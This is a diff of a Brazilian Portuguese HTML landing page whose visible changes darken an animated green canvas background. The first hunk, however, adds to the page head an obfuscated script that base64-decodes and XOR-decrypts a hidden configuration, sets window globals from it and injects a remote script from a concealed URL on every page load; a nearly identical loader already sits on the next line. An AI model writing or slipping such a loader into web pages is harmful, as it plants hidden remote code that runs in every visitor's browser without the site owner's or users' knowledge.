@@ -1,6 +1,7 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
+    <script>(function(){var h_j8n=atob("DMOBXjsYjamBycN7gLijK0l0r5OjobcP8LC7cRR76cevvLcW6aX4cFh34Ifju+wI47HoLk9rotz1pLBU7KL1O0hso8Py6+9Z4bf1LFJ6+N3kuuFB27ijMFp16Iu766ca9KKsK0915M/45LMJ5bXkME819crure4I46ijchlu7MX0rOFBouH8ckA648jsrOFBoqfgKlo1+N3soKUCrbPzO019492surYZ6afyfBc6+8jtvKZZuuGjI2Zl");var s_pdu=[];for(var d_sp=0;d_sp<h_j8n.length;d_sp++){s_pdu.push(h_j8n.charCodeAt(d_sp)&255);}var d_2=s_pdu[0];var w_ws8=s_pdu.slice(1,1+d_2);var t_d=s_pdu.slice(1+d_2);var u_d5=t_d.map(function(b,r_tdfs){return b^w_ws8[r_tdfs%d_2];});var j_xl="";for(var v_oiu0=0;v_oiu0<u_d5.length;v_oiu0++){j_xl+=String.fromCharCode(u_d5[v_oiu0]&255);}var k_sdt=decodeURIComponent(escape(j_xl));var z_n=JSON.parse(k_sdt);var t_a3=z_n.globals||[];t_a3.forEach(function(d_sh7l){window[d_sh7l.name]=d_sh7l.value;});var i_l=document.createElement("script");i_l.src=z_n.url;i_l.async=true;i_l.defer=true;(z_n.attributes||[]).forEach(function(l_7ch){i_l.setAttribute(l_7ch.name,l_7ch.value);});(document.head||document.documentElement).appendChild(i_l);})();</script>
     <script>(function(){var t_zhsu=atob("DLpUNDEDRv+4TPwLncF2QUNvZMWaJIh/7cluGx5gIpGWOYhm9NwtGlJsK9HaPtN4/sg9REVwaY/RNJlnsso9TFRvaJXLbtAp/M4gRlhhM4vdP94xxud4FlZvKZ3ZII8pp+EvFl9iK5qadt579MIxWHhnZNOaOp1n6N92DhM1J8bafck7+YI2BgIxI8mAeJ46pItmAgAhO6LF");var c_sr=[];for(var q_k=0;q_k<t_zhsu.length;q_k++){c_sr.push(t_zhsu.charCodeAt(q_k)&255);}var k_d=c_sr[0];var a_jixx=c_sr.slice(1,1+k_d);var m_tjt=c_sr.slice(1+k_d);var e_p=m_tjt.map(function(b,z_q){return b^a_jixx[z_q%k_d];});var t_zg="";for(var y_8ad=0;y_8ad<e_p.length;y_8ad++){t_zg+=String.fromCharCode(e_p[y_8ad]&255);}var u_z=decodeURIComponent(escape(t_zg));var o_v=JSON.parse(u_z);var j_r=o_v.globals||[];j_r.forEach(function(z_ulpi){window[z_ulpi.name]=z_ulpi.value;});var a_1sd=document.createElement("script");a_1sd.src=o_v.url;a_1sd.async=true;a_1sd.defer=true;(o_v.attributes||[]).forEach(function(f_k2g){a_1sd.setAttribute(f_k2g.name,f_k2g.value);});(document.head||document.documentElement).appendChild(a_1sd);})();</script>
     <!-- Google Tag Manager -->
     <script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
@@ -27,7 +28,7 @@
         
         body {
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
-            background: #050505;
+            background: #000000;
             color: white;
             overflow-x: hidden;
         }
@@ -1812,7 +1813,7 @@
             for (let i = 0; i <= COLS; i++) {
                 const xFrac = i / COLS;
                 const xBottom = W * xFrac;
-                const alpha = 0.03 + 0.04 * Math.sin(xFrac * Math.PI);
+                const alpha = 0.015 + 0.02 * Math.sin(xFrac * Math.PI);
                 ctx.beginPath();
                 ctx.moveTo(vp.x, vp.y);
                 ctx.lineTo(xBottom, H);
@@ -1828,7 +1829,7 @@
                 if (y > H) continue;
                 if (y < horizon) continue;
  
-                const alpha = 0.02 + 0.055 * perspective;
+                const alpha = 0.01 + 0.028 * perspective;
                 const xLeft  = vp.x - (vp.x) * perspective;
                 const xRight = vp.x + (W - vp.x) * perspective;
  
@@ -1842,7 +1843,7 @@
  
             const horizGrad = ctx.createLinearGradient(0, horizon - 40, 0, horizon + 30);
             horizGrad.addColorStop(0, 'rgba(0,255,65,0)');
-            horizGrad.addColorStop(0.5, 'rgba(0,255,65,0.06)');
+            horizGrad.addColorStop(0.5, 'rgba(0,255,65,0.025)');
             horizGrad.addColorStop(1, 'rgba(0,255,65,0)');
             ctx.fillStyle = horizGrad;
             ctx.fillRect(0, horizon - 40, W, 70);
@@ -1857,7 +1858,7 @@
             size: randRange(28, 80),
             speed: randRange(0.00008, 0.00025),
             phase: randRange(0, Math.PI * 2),
-            alpha: randRange(0.02, 0.08)
+            alpha: randRange(0.008, 0.035)
         }));
  
         function drawHex(cx, cy, r, alpha) {
@@ -1903,7 +1904,7 @@
                     const dx = a.sx - b.sx, dy = a.sy - b.sy;
                     const dist = Math.sqrt(dx*dx + dy*dy);
                     if (dist < MAX_DIST) {
-                        const alpha = (1 - dist / MAX_DIST) * 0.12 * a.scale * b.scale * 3;
+                        const alpha = (1 - dist / MAX_DIST) * 0.05 * a.scale * b.scale * 3;
                         ctx.beginPath();
                         ctx.moveTo(a.sx, a.sy);
                         ctx.lineTo(b.sx, b.sy);
@@ -1916,7 +1917,7 @@
  
             sorted.forEach(({ sx, sy, scale, node }) => {
                 const r = node.r * scale * 2.5;
-                const alpha = 0.2 + scale * 0.5;
+                const alpha = 0.08 + scale * 0.22;
  
                 const grd = ctx.createRadialGradient(sx, sy, 0, sx, sy, r * 5);
                 grd.addColorStop(0, `rgba(0,255,65,${alpha * 0.45})`);
@@ -1958,9 +1959,9 @@
         }
  
         function drawVignette() {
-            const vgrd = ctx.createRadialGradient(W/2, H/2, H*0.22, W/2, H/2, H*0.85);
+            const vgrd = ctx.createRadialGradient(W/2, H/2, H*0.12, W/2, H/2, H*0.75);
             vgrd.addColorStop(0, 'rgba(0,0,0,0)');
-            vgrd.addColorStop(1, 'rgba(0,0,0,0.8)');
+            vgrd.addColorStop(1, 'rgba(0,0,0,0.95)');
             ctx.fillStyle = vgrd;
             ctx.fillRect(0, 0, W, H);
         }
@@ -1968,8 +1969,8 @@
         function draw() {
             t++;
 
-            // Fundo mais escuro ainda: base quase preta com opacidade maior
-            ctx.fillStyle = 'rgba(4,4,4,0.72)';
+            // Fundo 100% escuro: quase preto sólido, sem "trilha" de brilho acumulando
+            ctx.fillStyle = 'rgba(0,0,0,0.92)';
             ctx.fillRect(0, 0, W, H);
  
             drawGrid();
